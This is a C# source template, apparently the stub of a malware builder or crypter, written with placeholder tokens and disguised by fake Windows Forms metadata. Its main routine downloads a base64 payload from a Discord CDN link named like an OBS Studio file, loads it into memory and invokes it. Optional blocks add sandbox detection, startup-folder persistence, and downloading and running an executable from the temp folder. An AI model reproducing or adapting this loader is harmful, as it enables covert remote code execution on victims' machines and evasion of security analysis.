using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;




//Default [assembly: AssemblyTitle("Windows Application .exe")]
//Default [assembly: AssemblyDescription("Windows Application")]
//Default [assembly: AssemblyProduct("Windows Forms ")]
//Default [assembly: AssemblyCopyright("Windows Forms Â© 2012")]
//Default [assembly: AssemblyFileVersion("3.4.0.0")]

//Assembly [assembly: AssemblyTitle("{1}")]
//Assembly [assembly: AssemblyDescription("{2}")]
//Assembly [assembly: AssemblyCompany("{3}")]
//Assembly [assembly: AssemblyProduct("{4}")]
//Assembly [assembly: AssemblyCopyright("{5}")]
//Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]


public class settings
{


    [STAThread]
    public static void Main(string[] args)
        {
            using (WebClient fff = new WebClient())
            {

                try
                {


                   //sandboxie controlsandboxie();

                    //Messega



                    //download try
                    //download {
                    //download  System.Net.WebClient appyrun = new System.Net.WebClient();
                    //download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
                    //download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
                    //download }
                    //download catch
                    //download {
                    //download }







                    string %1%;

                    %1% = "https://cdn.discordapp.com/attachments/844669981151985754/845847751560265748/OBS_Studio.txt";

                    WebClient %2%;

                    %2% = new WebClient();

                    string %3%;

                    %3% = %2%.DownloadString(%1%);

                    byte[] %4%;

                    %4% = Convert.FromBase64String(%3%);

                    string S = "pizzaorder.buynow";

                    string %5% = "meseken";

                    object spider = new object[] { %aPP%, string.Empty, fff.DownloadData("%Server%"), true };

                    string %6% = S;


                    Assembly A;

                    A  = AppDomain.CurrentDomain.Load(%4%);


                    A.GetType(%6%).InvokeMember(%5%, System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])spider);



                    //start  {
                    //start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
                    //start  }




                }
                catch { return; }




                   


            }

        }

    //sandboxie [DllImport("kernel32.dll")]
    //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
    //sandboxie static void controlsandboxie()
    //sandboxie {
    //sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
    //sandboxie     {
    //sandboxie        Environment.Exit(1);
    //sandboxie     }
    //sandboxie }
}
